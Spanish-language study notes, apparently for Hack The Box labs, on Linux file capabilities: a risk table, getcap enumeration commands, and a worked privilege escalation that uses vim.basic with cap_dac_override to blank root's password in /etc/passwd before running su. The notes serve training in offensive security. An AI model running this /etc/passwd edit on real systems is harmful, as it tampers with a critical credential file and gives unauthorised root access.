
## 1. ¿Qué son?

Las capabilities permiten conceder privilegios específicos a un ejecutable sin darle todos los privilegios de root.

Algunas capabilities mal configuradas pueden permitir escalar privilegios.

## 2. Capabilities importantes

|Capability|Función|Riesgo|
|---|---|---|
|`cap_setuid`|Permite cambiar el UID efectivo del proceso|Puede permitir obtener privilegios de root|
|`cap_setgid`|Permite cambiar el GID efectivo|Puede permitir obtener privilegios de grupo|
|`cap_sys_admin`|Permite realizar numerosas operaciones administrativas|Puede permitir controlar partes importantes del sistema|
|`cap_dac_override`|Permite eludir comprobaciones de permisos de archivos|Puede permitir leer o modificar archivos protegidos|
|`cap_net_bind_service`|Permite enlazarse a puertos privilegiados|Permite escuchar en puertos inferiores a 1024|
|`cap_sys_ptrace`|Permite inspeccionar o depurar otros procesos|Puede exponer información sensible|

## 3. Enumerar capabilities

Busca capabilities en los directorios habituales:

```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
```

También puedes comprobar un binario concreto:

```
getcap /usr/bin/vim.basic
```

Ejemplo de salida:

```
/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
```

**Qué debes buscar:** ejecutables poco habituales con capabilities que permitan eludir permisos o cambiar identidades.

## 4. Interpretar los valores

- `e`: _Effective_, la capability puede utilizarse efectivamente.
    
- `p`: _Permitted_, la capability está permitida para el proceso.
    
- `i`: _Inheritable_, puede participar en la herencia de capabilities entre procesos, según las reglas del sistema.
    

Ejemplos:

```
cap_net_raw=ep
cap_dac_override=eip
```

La combinación exacta determina cómo puede utilizarse la capability.

## 5. Explotación de `cap_dac_override`

Esta capability permite eludir determinadas comprobaciones de permisos de archivos.

En el ejemplo de HTB, `/usr/bin/vim.basic` tiene asignada esa capability:

```
getcap /usr/bin/vim.basic
```

Resultado:

```
/usr/bin/vim.basic cap_dac_override=eip
```

El material muestra cómo aprovecharla para modificar `/etc/passwd` y eliminar el campo de contraseña de la cuenta root.

Ejemplo del laboratorio:

```
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

Comprueba el resultado:

```
head -n 1 /etc/passwd
```

Si aparece:

```
root::0:0:root:/root:/bin/bash
```

el campo de contraseña de root está vacío. En el entorno del ejercicio, el material indica que esto permite intentar cambiar a root con:

```
su
```

**Importante:** esta técnica modifica un archivo crítico del sistema. En un sistema real puede provocar problemas de seguridad y no siempre funcionará, porque intervienen otras medidas de protección.

## 6. Checklist para HTB

Cuando consigas una shell de usuario:

1. Enumera las capabilities de los ejecutables.
    
2. Identifica binarios con privilegios inesperados.
    
3. Comprueba qué permite hacer la capability asignada.
    
4. Busca si permite leer o modificar archivos protegidos o cambiar la identidad del proceso.
    
5. Utiliza el binario vulnerable para acceder a los recursos que necesitas.
    

**Comando clave para memorizar:**

```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
```
